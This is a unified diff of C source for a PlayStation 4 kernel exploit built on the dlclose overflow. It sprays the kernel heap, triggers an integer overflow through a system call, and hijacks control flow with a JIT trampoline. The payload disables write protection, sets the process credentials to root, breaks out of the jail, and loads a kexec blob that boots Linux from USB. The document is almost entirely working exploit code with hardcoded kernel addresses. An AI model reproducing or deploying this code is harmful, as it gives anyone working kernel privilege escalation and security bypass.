@@ -2,20 +2,25 @@
 	Code written based on info available here http://cturt.github.io/dlclose-overflow.html
 
 	See attached LICENCE file
-	Thanks to CTurt and qwertyoruiop
+	Thanks to CTurt, qwertyoruiop and marcan
 
 	- @kr105rlz
 */
 
-#include "ps4.h"
+#define DEBUG_SOCKET 1
 
-#define DEBUG_SOCKET
+#include "ps4.h"
 #include "defines.h"
 
-static int sock;
-static void *dump;
+extern char kexec[];
+extern unsigned kexec_size;
 
-void payload(struct knote *kn) {
+static int sock;
+
+void usbthing();
+
+void payload(struct knote *kn)
+{
 	struct thread *td;
 	struct ucred *cred;
 
@@ -32,17 +37,12 @@ void payload(struct knote *kn) {
 	// Disable write protection
 	uint64_t cr0 = readCr0();
 	writeCr0(cr0 & ~X86_CR0_WP);
-	
-	// sysctl_machdep_rcmgr_debug_menu and sysctl_machdep_rcmgr_store_moe
-	*(uint16_t *)0xFFFFFFFF82607C46 = 0x9090;
-	*(uint16_t *)0xFFFFFFFF82607826 = 0x9090;
-	
-	*(char *)0xFFFFFFFF8332431A = 1;
-	*(char *)0xFFFFFFFF83324338 = 1;
-	
+
+	// Patch functions here if required
+
 	// Restore write protection
 	writeCr0(cr0);
-	
+
 	// Resolve creds
 	cred = td->td_proc->p_ucred;
 
@@ -51,23 +51,6 @@ void payload(struct knote *kn) {
 	cred->cr_ruid = 0;
 	cred->cr_rgid = 0;
 	cred->cr_groups[0] = 0;
-
-	void *td_ucred = *(void **)(((char *)td) + 304); // p_ucred == td_ucred
-	
-	// sceSblACMgrIsSystemUcred
-	uint64_t *sonyCred = (uint64_t *)(((char *)td_ucred) + 96);
-	*sonyCred = 0xffffffffffffffff;
-	
-	// sceSblACMgrGetDeviceAccessType
-	uint64_t *sceProcType = (uint64_t *)(((char *)td_ucred) + 88);
-	*sceProcType = 0x3801000000000013; // Max access
-	
-	// sceSblACMgrHasSceProcessCapability
-	uint64_t *sceProcCap = (uint64_t *)(((char *)td_ucred) + 104);
-	*sceProcCap = 0xffffffffffffffff; // Sce Process
-	
-	((uint64_t *)0xFFFFFFFF832CC2E8)[0] = 0x123456; //priv_check_cred bypass with suser_enabled=true
-	((uint64_t *)0xFFFFFFFF8323DA18)[0] = 0; // bypass priv_check
 
 	// Jailbreak ;)
 	cred->cr_prison = (void *)0xFFFFFFFF83237250; //&prison0
@@ -79,6 +62,13 @@ void payload(struct knote *kn) {
 	uint64_t *rootvnode = (uint64_t *)0xFFFFFFFF832EF920;
 	*td_fdp_fd_rdir = *rootvnode;
 	*td_fdp_fd_jdir = *rootvnode;
+
+	void *DT_HASH_SEGMENT = (void *)0xffffffff82200160;
+	memcpy(DT_HASH_SEGMENT, kexec, kexec_size);
+
+	void (*kexec_init)(void *, void *) = DT_HASH_SEGMENT;
+
+	kexec_init((void*)0xFFFFFFFF8246E340, NULL);
 }
 
 // Perform kernel allocation aligned to 0x800 bytes
@@ -95,27 +85,24 @@ void kernelFree(int allocation) {
 	close(allocation);
 }
 
-void *exploitThread(void *none) {
+void *exploitThread(void *none)
+{
 	printfsocket("[+] Entered exploitThread\n");
 
+	// Calculate sizes for exploit
 	uint64_t bufferSize = 0x8000;
-	uint64_t overflowSize = 0x8000;
-	uint64_t copySize = bufferSize + overflowSize;
-	
-	// Round up to nearest multiple of PAGE_SIZE
-	uint64_t mappingSize = (copySize + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
-	
+	uint64_t overflowSize = 0x4000;
+	uint64_t mappingSize = bufferSize + overflowSize;
+	int64_t count = (0x100000000 + bufferSize) / 4;
+
+	// Map address to control overflow later on
 	uint8_t *mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
 	munmap(mapping + mappingSize, PAGE_SIZE);
-	
-	uint8_t *buffer = mapping + mappingSize - copySize;
-	
-	int64_t count = (0x100000000 + bufferSize) / 4;
 
 	// Create structures
 	struct knote kn;
 	struct filterops fo;
-	struct knote **overflow = (struct knote **)(buffer + bufferSize);
+	struct knote **overflow = (struct knote **)(mapping + bufferSize);
 	overflow[2] = &kn;
 	kn.kn_fop = &fo;
 
@@ -124,12 +111,11 @@ void *exploitThread(void *none) {
 	void *trampe = NULL;
 	int executableHandle;
 	int writableHandle;
-	uint8_t trampolinecode[] = {
-		0x58, // pop rax
-		0x48, 0xB8, 0x19, 0x39, 0x40, 0x82, 0xFF, 0xFF, 0xFF, 0xFF, // movabs rax, 0xffffffff82403919
-		0x50, // push rax
-		0x48, 0xB8, 0xBE, 0xBA, 0xAD, 0xDE, 0xDE, 0xC0, 0xAD, 0xDE, // movabs rax, 0xdeadc0dedeadbabe
-		0xFF, 0xE0 // jmp rax
+	uint8_t trampolinecode[] = {	0x58, // pop rax
+					0x48, 0xB8, 0x19, 0x39, 0x40, 0x82, 0xFF, 0xFF, 0xFF, 0xFF, // movabs rax, 0xffffffff82403919
+					0x50, // push rax
+					0x48, 0xB8, 0xBE, 0xBA, 0xAD, 0xDE, 0xDE, 0xC0, 0xAD, 0xDE, // movabs rax, 0xdeadc0dedeadbabe
+					0xFF, 0xE0 // jmp rax
 	};
 
 	// Get Jit memory
@@ -142,7 +128,7 @@ void *exploitThread(void *none) {
 
 	// Copy trampoline to allocated address
 	memcpy(trampw, trampolinecode, sizeof(trampolinecode));	
-	*(void **)(trampw + 14) = (void *)payload;
+	*(uint64_t*)(trampw + 14) = (uint64_t)payload;
 
 	// Call trampoline when overflown
 	fo.f_detach = trampe;
@@ -155,16 +141,16 @@ void *exploitThread(void *none) {
 	printfsocket("[+] Creating %d sockets\n", fd);
 
 	// Create sockets
-	for(int i = 0; i < 0x2000; i++) {
+	for(int i=0; i < 0x2000; i++) {
 		sockets[i] = sceNetSocket("sss", AF_INET, SOCK_STREAM, 0);
 		if(sockets[i] >= fd) {
-			sockets[i + 1] = -1;
+			sockets[i+1] = -1;
 			break;
 		}
 	}
 
 	// Spray the heap
-	for(int i = 0; i < 50; i++) {
+	for(int i=0; i < 50; i++) {
 		allocation[i] = kernelAllocation(bufferSize, fd);
 		printfsocket("[+] allocation = %llp\n", allocation[i]);
 	}
@@ -174,6 +160,13 @@ void *exploitThread(void *none) {
 	m2 = kernelAllocation(bufferSize, fd);
 	kernelFree(m);
 
+	// Close sockets
+	for(int i=0; i < 0x2000; i++) {
+		if(sockets[i] == -1)
+			break;
+		sceNetSocketClose(sockets[i]);
+	}
+
 	// Perform the overflow
 	int result = syscall(597, 1, mapping, &count);
 	printfsocket("[+] Result: %d\n", result);
@@ -181,27 +174,12 @@ void *exploitThread(void *none) {
 	// Execute the payload
 	printfsocket("[+] Freeing m2\n");
 	kernelFree(m2);
-	
-	// Close sockets
-	for(int i = 0; i < 0x2000; i++) {
-		if(sockets[i] == -1)
-			break;
-		sceNetSocketClose(sockets[i]);
-	}
-	
-	// Free allocations
-	for(int i = 0; i < 50; i++) {
-		kernelFree(allocation[i]);
-	}
-	
-	// Free the mapping
-	munmap(mapping, mappingSize);
-	
+
 	return NULL;
 }
 
 int _main(void) {
-	ScePthread thread;
+	ScePthread thread1;
 
 	initKernel();	
 	initLibc();
@@ -209,21 +187,18 @@ int _main(void) {
 	initJIT();
 	initPthread();
 
-#ifdef DEBUG_SOCKET
+#if DEBUG_SOCKET
 	struct sockaddr_in server;
 
 	server.sin_len = sizeof(server);
 	server.sin_family = AF_INET;
-	server.sin_addr.s_addr = IP(192, 168, 0, 4);
+	server.sin_addr.s_addr = IP(192, 168, 1, 129);
 	server.sin_port = sceNetHtons(9023);
 	memset(server.sin_zero, 0, sizeof(server.sin_zero));
 	sock = sceNetSocket("debug", AF_INET, SOCK_STREAM, 0);
 	sceNetConnect(sock, (struct sockaddr *)&server, sizeof(server));
-	
 	int flag = 1;
 	sceNetSetsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(int));
-	
-	dump = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
 #endif
 
 	printfsocket("[+] Starting...\n");
@@ -231,42 +206,82 @@ int _main(void) {
 	printfsocket("[+] GID = %d\n", getgid());
 
 	// Create exploit thread
-	if(scePthreadCreate(&thread, NULL, exploitThread, NULL, "exploitThread") != 0) {
-		printfsocket("[-] pthread_create error\n");
+	if (scePthreadCreate(&thread1, NULL, exploitThread, NULL, "pthread_pene") != 0) {
+		printfsocket("[+] pthread_create error\n");
 		return 0;
 	}
 
 	// Wait for thread to exit
-	scePthreadJoin(thread, NULL);
+	scePthreadJoin(thread1, NULL);
 
 	// At this point we should have root and jailbreak
-	if(getuid() != 0) {
-		printfsocket("[-] Kernel patch failed!\n");
+	if(getuid() && getuid()) {
+		printfsocket("[+] Kernel patch failed!\n");
 		sceNetSocketClose(sock);
 		return 1;
 	}
 
 	printfsocket("[+] Kernel patch success!\n");
 
-	// Enable debug menu
-	int (*sysctlbyname)(const char *name, void *oldp, size_t *oldlenp, const void *newp, size_t newlen) = NULL;
-	RESOLVE(libKernelHandle, sysctlbyname);
-	
-	uint32_t enable;
-	size_t size;
-	
-	enable = 1;
-	size = sizeof(enable);
-	
-	sysctlbyname("machdep.rcmgr_utoken_store_mode", NULL, NULL, &enable, size);
-	sysctlbyname("machdep.rcmgr_debug_menu", NULL, NULL, &enable, size);
-	
-#ifdef DEBUG_SOCKET
-	munmap(dump, PAGE_SIZE);	
-#endif
-	
+	usbthing();
+
 	printfsocket("[+] bye\n");
 	sceNetSocketClose(sock);
-	
+
 	return 0;
+}
+
+void usbthing()
+{
+	// Open bzImage file from USB
+	FILE *fkernel = fopen("/mnt/usb0/bzImage", "r");
+	fseek(fkernel, 0L, SEEK_END);
+	int kernelsize = ftell(fkernel);
+	fseek(fkernel, 0L, SEEK_SET);
+
+	// Open initramfs file from USB
+	FILE *finitramfs = fopen("/mnt/usb0/initramfs.cpio.gz", "r");
+	fseek(finitramfs, 0L, SEEK_END);
+	int initramfssize = ftell(finitramfs);
+	fseek(finitramfs, 0L, SEEK_SET);
+
+	printfsocket("kernelsize = %d\n", kernelsize);
+	printfsocket("initramfssize = %d\n", initramfssize);
+
+	// Sanity checks
+	if(kernelsize == 0 || initramfssize == 0) {
+		printfsocket("no file error im dead");
+		fclose(fkernel);
+		fclose(finitramfs);
+		return;
+	}
+
+	void *kernel, *initramfs;
+	char *cmd_line = "panic=0 clocksource=tsc radeon.dpm=0 console=tty0 console=ttyS0,115200n8 "
+			"console=uart8250,mmio32,0xd0340000 video=HDMI-A-1:1920x1080-24@60 "
+			"consoleblank=0 net.ifnames=0 drm.debug=0";
+	
+	kernel = malloc(kernelsize);
+	initramfs = malloc(initramfssize);
+
+	printfsocket("kernel = %llp\n", kernel);
+	printfsocket("initramfs = %llp\n", initramfs);
+
+	fread(kernel, kernelsize, 1, fkernel);
+	fread(initramfs, initramfssize, 1, finitramfs);
+
+	fclose(fkernel);
+	fclose(finitramfs);
+
+	// Call sys_kexec
+	syscall(153, kernel, kernelsize, initramfs, initramfssize, cmd_line);
+
+	free(kernel);
+	free(initramfs);
+
+	// Reboot
+	int evf = syscall(540, "SceSysCoreReboot");
+	syscall(546, evf, 0x4000, 0);
+	syscall(541, evf);
+	syscall(37, 1, 30);
 }
